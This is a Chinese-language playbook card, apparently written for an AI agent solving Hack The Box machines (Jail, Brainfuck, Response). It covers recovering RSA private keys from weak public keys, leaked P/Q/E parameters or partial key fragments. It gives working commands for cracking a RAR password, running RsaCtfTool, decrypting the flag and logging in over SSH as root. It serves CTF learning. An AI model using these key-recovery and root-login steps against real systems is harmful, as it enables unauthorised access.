---
name: 'weak-rsa-key-recovery'
description: '弱 RSA 与密钥材料泄露：从公钥/残钥还原私钥再 SSH 登录。三种模式——公钥本身弱（小模数/共享素数/近素数，RsaCtfTool 一把梭）、参数泄漏（p/q/e 摆在 .sage 脚本、debug.txt、加密脚本里）、密钥文件残缺（只剩片段 CRT 参数，用 N/e 与 q 补全）。（检索词：RsaCtfTool/rsactftool/weak RSA/共享素数/shared prime/Fermat/Wiener/小模数/private key recovery/partial key/CRT/ssh-keygen -y/openssl rsa -pubin/弱 RSA/私钥还原/残钥/密钥泄露/encrypt.sage/debug.txt/weak-RSA/shared-prime/private-key-recovery/partial-key）'
whenToUse: '拿到一个公钥文件（*.pub/authorized_keys）、一段残缺私钥，或目录里同时出现 encrypt.sage / output.txt / debug.txt 三件套，且 flag 明显被加密时加载。'
metadata: { domain: crypto, tier: T3 }
---

# 弱 RSA 与密钥材料泄露:从公钥/残钥还原私钥

> 来自 Insane 官方 WP 逐台回核,**3 台命中**:Jail / Brainfuck / Response

## 触发信号

| 观察到的现象 | 出处 |
|---|---|
| 家目录/取证目录里同时有 `encrypt.sage` + `output.txt` + `debug.txt`(或 `output*`) | Brainfuck(`/home/orestis`) |
| 压缩包里解出一个**公钥文件**(`*rootauthorizedsshkey.pub`、`id_rsa.pub`、`authorized_keys`) | Jail(`/var/adm/.keys` 里的加密 RAR) |
| 脚本/日志/调试输出里出现单字母大写变量 `P`、`Q`、`E`、`N`、`q`、`d` | Brainfuck(`debug.txt` 直接泄 `P`/`Q`/`E`) |
| 私钥文件只有片段:base64 缺填充、被截图截断、只剩 CRT 参数的一部分 | Response(截图里的 root 私钥最后几行) |
| `output.txt` 是一坨十进制/hex 大整数,不是可读文本 | Brainfuck |
| flag 本身读不到,但旁边摆着加密脚本和参数 | 三台的共同形态 |

**为什么它会出现在机器题里**:这是 CTF 式 crypto 被塞进"读 flag"这一步 —— **flag 被加密了,而加密脚本/加密参数就摆在同一个目录里**。它不是让你做纯数学题,而是让你认出"附近的文件就是答案"。

## 前置验证

```bash
# 0) 🆕 发现技巧:先看目录里有没有 *.sage / debug* / output* 三件套
find / -name '*.sage' -o -name 'debug*' -o -name 'output*' -o -name '*.pub' 2>/dev/null
ls -la /home/<user>/

# 1) 读公钥的模数与指数(PEM 格式)
openssl rsa -pubin -text -noout < pub.pem
# OpenSSH 格式(ssh-rsa AAAA...)不是 PEM,先转:
ssh-keygen -e -m PKCS8 -f id_rsa.pub > pub.pem

# 2) 有私钥时导出公钥做核对(确认 N/e 与目标 authorized_keys 同一把)
ssh-keygen -y -f id_rsa

# 3) 判断"弱"在哪:Modulus 位数小得可笑? 有两把公钥可试共享素数? 素数是否挨得很近?
```

## 模式 1: 公钥本身弱 —— `RsaCtfTool` 自动攻击族

条件:只拿到公钥,但模数太小、与另一把公钥共享素数、或两个素数挨得近。

```bash
# Jail:先解出公钥
rar2john keys.rar > keys.hash
john keys.hash --wordlist=wordlist.txt      # 口令 Morris1962!(提示泄露"姓氏+年份+特殊字符")
# 从弱公钥直接还原私钥
RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private
```

`RsaCtfTool` 会自动轮试常见族:**小模数分解、两把公钥共享素数(`gcd(N1,N2)`)、Fermat 近素数、Wiener 小私钥指数、共模攻击**等;有多把公钥时全部一起喂给它。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Jail | `/var/adm/.keys` 里加密 RAR → `rar2john` + 定向字典破出 `Morris1962!` → 解出弱公钥 → `RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private` → 直接 SSH 登录 root |

## 模式 2: 参数泄漏 —— `p`/`q`/`e` 就在脚本或调试输出里

条件:flag 被加密,但加密脚本/调试文件把 `P`、`Q`、`E` 一起留下了。

```bash
# Brainfuck:ls -la /home/orestis/
#   encrypt.sage  → 表明 output.txt 是加密后的 root flag
#   output.txt    → 密文(十进制大整数)
#   debug.txt     → 泄漏了加密所用的 P、Q、E
# 用 https://crypto.stackexchange.com/a/19530 的脚本解 output.txt,得到十进制明文,再转 ASCII:
python3 -c "print(bytes.fromhex(format(<DECIMAL NUMBER>, 'x')))"
```

本质只有三行(有 `P`/`Q`/`E` 就等于交出私钥):

```python
d = pow(E, -1, (P-1)*(Q-1))
m = pow(int(open('output.txt').read()), d, P*Q)
print(bytes.fromhex(format(m, 'x')))
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Brainfuck | `/home/orestis` 下 `encrypt.sage` 指明 `output.txt` 是加密的 root flag,`debug.txt` 泄 `P`/`Q`/`E`;按 stackexchange a/19530 的脚本解密后 `bytes.fromhex(format(x,'x'))` 得明文 |

## 模式 3: 密钥文件残缺 —— 用 `N`/`e` 与一个素因子补全

条件:私钥只剩一段(截图/缺填充),但能拿到对应公钥的 `N`、`e`,以及任意一个素因子。

```bash
# Response:截图里的私钥 base64 缺填充,先补 AA 再解
(echo -n AA; cat partial_key) | grep -v '-' | base64 -d
xxd -p                                   # 拿 hex,按 OpenSSH 私钥结构取最后三段中的第二 RSA 素数 q(在 c70b 与 3ed9 之间)

# 公钥侧:authorized_keys 是 OpenSSH 二进制格式
#   keytype 长度+串、e 长度+串、N 长度+串
python3 -c "...解析出 e 与 N..."

# 补全(整除必须成立,否则取错了段)
p = N // q;  assert p * q == N;  d = pow(e, -1, (p-1)*(q-1))

# WP 只给了"用 RsaCtfTool 重建私钥"这一步,没有可核对的命令行;
# 且标准 CLI **没有素因子入参** —— 只有完整公钥时走这条:
RsaCtfTool.py --publickey pub.pem --private
chmod 600 root_key
ssh -i root_key root@10.10.11.163
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Response | 截图里的残缺私钥(补 `AA` 后 `base64 -d` + `xxd -p`)取出 `q`;`authorized_keys` 解析出 `N`/`e`;`RsaCtfTool` 重建 → `chmod 600 root_key` → `ssh -i` 直接拿 root |

> Windows 侧对照(一句带过):Ethereal 泄露的是 **CA 私钥**(`MyCA.cer` / `MyCA.pvk`),用途不是登录而是**签 MSI 绕 AppLocker** —— 同一类"密钥材料泄漏",不同收尾。

## 快速检查清单

```bash
[ ] find / -name '*.sage' -o -name 'debug*' -o -name 'output*' -o -name '*.pub'
[ ] ls -la 家目录 / 取证目录 / 压缩包解出来的东西
[ ] openssl rsa -pubin -text -noout → 模数多少位? 指数是不是 65537?
[ ] ssh-keygen -y -f id_rsa 导出公钥,核对是不是目标那把
[ ] 明文脚本/日志里有没有 P/Q/E/N/q/d 单字母大写变量
[ ] output.txt 是大整数 → 先找加密脚本,不要硬解
[ ] 私钥片段:base64 缺填充? → 补 AA;只剩 CRT 参数? → 用 N/e 反推
[ ] 重建出来的 key chmod 600,否则 ssh 直接拒绝
```

## 教训

1. **公钥"可以公开"不等于"无害"** —— 弱模数/共享素数可以直接还原私钥(Jail)。
2. **加密脚本把 `P`、`Q`、`E` 写进 `debug.txt` 等于直接交出私钥**(Brainfuck);看到 `encrypt.sage` 就先找同目录的"输入/输出/调试"三个文件。
3. **从"部分泄露 + 公钥"重建私钥是纯数学题**:拿到 `N`、`e` 和一个素因子 `q` 就足以还原 `p`、`d`(Response)。
4. 🔴 **不是所有公钥都能打**:`N` 是正常的 2048 位且两个素因子随机时,任何攻击族都无解 —— `RsaCtfTool` 跑不出来就说明"这把公钥是真的强",该换路而不是硬耗。
5. 🔴 **OpenSSH 私钥的段序要数清**:Response 的残缺片段里,后三段依次是 **`q`、comment、padding** —— 即 `q` 是这三段里的**第一段**(完整 OpenSSH RSA 段序为 `n,e,d,iqmp,p,q`,`q` 是最后一段)。取错段时 `N // q` 不整除,用整除校验立刻发现问题。
6. 🔴 **base64 缺填充解不开**:先补 `AA`(`(echo -n AA; cat partial)|grep -v '-'|base64 -d`),OCR 出来的片段常常缺尾部。
7. 🔴 **重建后的私钥必须 `chmod 600`**,否则 ssh 会以权限过宽拒绝加载。
8. 私钥到手后立刻 `ssh-keygen -y -f` 导出公钥与目标 `authorized_keys` 比对,确认是同一把再登。

## 相关卡

- `linux-binary-stack-rop` —— Jail 里拿到 `rootauthorizedsshkey.pub` 之前是 7411 端口的栈溢出(先执行,再谈密钥)
- `password-attacks` —— 加密 RAR/带口令私钥:`rar2john`/`ssh2john` + `john` 定向字典
- `challenge-crypto-prng` —— crypto 姊妹路线:自定义 PRNG 预测与协议设计缺陷类题型
- `challenge-insane-playbook` —— 如果这是附件型 Challenge 而不是机器题,先走那边的领域路由
- `linux-privesc` —— 还原出的私钥用于登录后,接着走提权检查表
- `windows-privesc` —— Ethereal 式的 CA 私钥签 MSI 绕 AppLocker 场景
